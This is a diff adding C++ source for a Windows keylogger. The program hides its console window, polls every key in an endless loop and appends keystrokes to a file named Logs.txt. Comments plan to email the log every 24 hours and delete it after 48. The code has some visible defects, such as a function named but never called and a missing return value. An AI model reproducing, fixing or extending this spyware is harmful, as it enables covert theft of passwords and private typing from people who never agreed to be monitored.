@@ -1,0 +1,67 @@
+#include <Windows.h>
+#include <fstream>
+#include <stdio.h>
+#include <string>
+
+#include <iostream>
+
+using namespace std;
+void writeData(string x)
+{
+	ofstream logfile; 
+	logfile.open("Logs.txt", fstream::app); //append file, write to Logs.txt
+	logfile << x; //write
+	logfile.close(); //close
+}
+void Stealth()
+{
+	HWND hWnd; //opaque pointer
+	AllocConsole; //Allocates a new console for the calling process.
+	hWnd = FindWindowA("ConsoleWindowA", NULL); //Find the window handle with class name "ConsoleWindowClass".
+	ShowWindow(hWnd, 0); // hide it
+}
+bool isKeyHere(int key)
+{
+	switch (key)
+	{
+	case VK_RETURN: 
+		writeData("\n"); //writes  to the file
+		break;
+	case VK_BACK:
+		writeData("\b");
+		break;
+	case VK_SPACE: 
+		writeData(" ");
+		break;
+	case VK_SHIFT:
+		writeData("Shift");
+		break;
+	case VK_OEM_PERIOD: 
+		writeData(".");
+		break;
+	case VK_TAB:
+		writeData("    ");
+		break;
+	default: return false;
+	}
+}
+int main()
+{
+	Stealth();
+	ofstream logfile; //delete the logfile eof and create file with new name; //delete file after 48 hrs (sleep) 
+	char key;
+	while (true)
+	{
+		for (key = 8; key <= 255; key++)
+		{
+			if (GetAsyncKeyState(key) == -32767) {
+				if (isKeyHere(key) == 0)
+					logfile.open("Logs.txt", fstream::app); //append file
+				logfile << key;
+				logfile.close();
+			}
+		}
+	}
+	
+}
+	//configure to autosend email every 24 hours. 
